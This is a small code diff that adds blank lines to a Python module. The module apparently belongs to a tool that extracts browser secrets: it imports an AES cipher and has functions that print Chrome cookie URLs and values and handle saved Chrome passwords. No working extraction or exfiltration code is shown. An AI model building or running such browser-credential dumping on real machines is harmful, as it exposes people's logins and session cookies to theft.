@@ -1,4 +1,5 @@
 from Cryptodome.Cipher import AES
+
 import app.utils
 
 
@@ -54,6 +55,7 @@ def output_chrome_cookies(print_object: list):
     print(app.utils.block + '[--]')
     print(app.utils.title + '|Url|' + app.utils.data + print_object[0])
     print(app.utils.title + '|Value|' + app.utils.data + print_object[1])
+
 
 def handle_all_chrome_modules(results: dict):
     chrome_passwords = results.get("Chrome-Passwords")
